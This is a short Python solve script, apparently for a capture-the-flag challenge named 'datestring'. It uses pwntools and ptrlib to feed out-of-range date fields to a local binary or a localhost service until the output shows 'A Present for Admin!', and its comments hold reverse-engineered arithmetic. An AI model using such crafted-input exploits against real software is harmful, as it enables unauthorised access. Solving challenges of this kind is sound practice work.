#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./datestring")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main(year: int) -> bool:
    io = connect()

    # 0xb = (month - 1) % 0xc
    year = 1

    io.sendlineafter("Year: ", str(year))
    io.sendlineafter("Month: ", str(0xC))
    io.sendlineafter("Day: ", str(0x3A))
    io.sendlineafter("Hour: ", str(0))
    io.sendlineafter("Minute: ", str(0))
    io.sendlineafter("Second: ", str(0))

    # rdx_35 = 0x3a + 0xc * 0x17 / 9 + 4 + (year_2 >> 2) + (year_3 >> 0x1f) - ((year_3 * 0x51eb851f) >> 0x20) >> 5) + year / 0x190
    # rdx_35 = 92 + (year_2 >> 2) + (year_3 >> 0x1f) - ((year_3 * 0x51eb851f) >> 0x20) >> 5) + year / 0x190

    # if month > 2:
    # rdx_35 = 0x3a + 0xc * 0x17 / 9 + 4 + (year_2 >> 2) + (year >> 0x1f) - ((year * 0x51eb851f) >> 0x20) >> 5) + year / 0x190

    io.recvuntil("Formatted date: ")
    io.recvuntil("\n")
    r = io.recvall()
    if b"A Present for Admin!" in r:
        print(r)
        return True

    return False


if __name__ == "__main__":
    for i in range(1000):
        if main(i):
            break
